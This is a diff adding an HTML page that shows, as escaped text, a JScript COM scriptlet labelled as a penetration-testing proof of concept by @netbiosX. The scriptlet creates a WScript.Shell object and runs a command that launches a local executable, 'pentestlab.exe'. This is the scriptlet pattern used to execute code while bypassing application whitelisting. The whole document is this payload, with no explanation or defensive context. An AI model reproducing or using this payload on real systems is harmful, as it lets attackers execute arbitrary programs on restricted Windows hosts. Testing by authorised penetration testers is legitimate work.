@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>sct.sct</title>
+</head><body>&lt;?XML version="1.0"?&gt;<br/>
+&lt;scriptlet&gt;<br/>
+&lt;registration <br/>
+&nbsp; &nbsp; progid="Pentest"<br/>
+&nbsp; &nbsp; classid="{F0001111-0000-0000-0000-0000FEEDACDC}" &gt;<br/>
+&lt;!-- Proof Of Concept - @netbiosX --&gt;<br/>
+&lt;script language="JScript"&gt;<br/>
+&lt;![CDATA[<br/>
+<br/>
+var r = new ActiveXObject("WScript.Shell").Run("cmd /k cd c:\ &amp; pentestlab.exe");&#09;<br/>
+<br/>
+]]&gt;<br/>
+&lt;/script&gt;<br/>
+&lt;/registration&gt;<br/>
+&lt;/scriptlet&gt;</body></html>
